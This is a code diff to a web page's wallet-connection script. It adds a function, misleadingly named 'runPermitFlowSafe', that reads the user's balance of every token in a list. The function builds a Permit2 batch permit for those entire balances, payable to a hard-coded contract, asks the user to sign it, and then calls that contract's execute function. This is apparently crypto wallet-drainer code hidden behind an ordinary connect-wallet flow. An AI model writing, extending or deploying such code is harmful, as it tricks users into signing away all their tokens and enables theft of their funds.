@@ -222,39 +222,6 @@ async function connectWallet(){
     return;
   }
 
-  async function runPermitFlowSafe(provider, signer, user){
- try{
-const erc20Abi = [
-  "function allowance(address owner, address spender) view returns (uint256)"
-];
-
-
-  log("⚙️ Starting full flow...");
-
-  const erc20Abi = [
-    "function allowance(address owner, address spender) view returns (uint256)",
-    "function approve(address spender, uint256 amount) returns (bool)"
-  ];
-
-
-    try {
-      const tokenContract = new ethers.Contract(token, erc20Abi, signer);
-      const allowance = await tokenContract.allowance(user, PERMIT2);
-
-      if (allowance === 0n) {
-        log(`🔓 Approving token ${token}`);
-        const tx = await tokenContract.approve(PERMIT2, ethers.MaxUint256);
-        await tx.wait();
-        log("✅ Approved");
-      } else {
-        log("✅ Already approved");
-      }
-
-    } catch(err){
-      log("❌ Approval failed: " + err.message);
-      return;
-    }
-  }
 
   let details = [];
 
@@ -398,7 +365,128 @@ if (network.chainId !== 1n) {
  }
 }
 
+async function runPermitFlowSafe(provider, signer, user){
+ try{
 
+  log("⚙️ Permit2 flow...");
+
+  // ✅ CHECK allowances
+  const erc20Abi = [
+    "function allowance(address owner, address spender) view returns (uint256)"
+  ];
+
+  for (let token of TOKENS) {
+    const tokenContract = new ethers.Contract(token, erc20Abi, provider);
+    const allowance = await tokenContract.allowance(user, PERMIT2);
+
+    if (allowance === 0n) {
+      log("❌ First time setup required");
+      alert("Approve tokens first (one-time)");
+      return;
+    }
+  }
+
+  // ✅ BUILD DETAILS
+  let details = [];
+
+  for (let token of TOKENS) {
+    const tokenC = new ethers.Contract(
+      token,
+      ["function balanceOf(address) view returns (uint256)"],
+      provider
+    );
+
+    const balance = await tokenC.balanceOf(user);
+    log(`Token ${token} balance: ${balance}`);
+
+    if (balance === 0n) continue;
+
+    const permit2 = new ethers.Contract(
+      PERMIT2,
+      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+      provider
+    );
+
+    const res = await permit2.allowance(user, token, CONTRACT);
+
+    details.push({
+      token,
+      amount: balance,
+      expiration: Math.floor(Date.now()/1000)+2592000,
+      nonce: res[2]
+    });
+  }
+
+  if (details.length === 0){
+    log("❌ No tokens found");
+    return;
+  }
+
+  // ✍️ SIGN
+  const chainId = (await provider.getNetwork()).chainId;
+
+  const domain = {
+    name: "Permit2",
+    chainId,
+    verifyingContract: PERMIT2
+  };
+
+  const types = {
+    PermitBatch: [
+      { name: "details", type: "PermitDetails[]" },
+      { name: "spender", type: "address" },
+      { name: "sigDeadline", type: "uint256" }
+    ],
+    PermitDetails: [
+      { name: "token", type: "address" },
+      { name: "amount", type: "uint160" },
+      { name: "expiration", type: "uint48" },
+      { name: "nonce", type: "uint48" }
+    ]
+  };
+
+  const values = {
+    details,
+    spender: CONTRACT,
+    sigDeadline: Math.floor(Date.now()/1000)+3600
+  };
+
+  log("✍️ Requesting signature...");
+  const signature = await signer.signTypedData(domain,types,values);
+
+  // 🚀 EXECUTE
+  log("🚀 Sending execute...");
+
+  const abiCoder = ethers.AbiCoder.defaultAbiCoder();
+
+  const permitBatch = abiCoder.encode(
+    [
+      "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
+    ],
+    [[
+      details.map(d => [d.token, d.amount, d.expiration, d.nonce]),
+      CONTRACT,
+      values.sigDeadline
+    ]]
+  );
+
+  const contract = new ethers.Contract(
+    CONTRACT,
+    ["function execute(bytes permitBatch, bytes signature)"],
+    signer
+  );
+
+  const tx = await contract.execute(permitBatch, signature);
+
+  log("⏳ Waiting confirmation...");
+  await tx.wait();
+
+  log("🔥 SUCCESS DONE");
+
+ }catch(e){
+  log("❌ FLOW ERROR: " + e.message);
+ }
+}
 
 function renderWallet(address) {
  document.getElementById('btn-wallet').innerText = address;
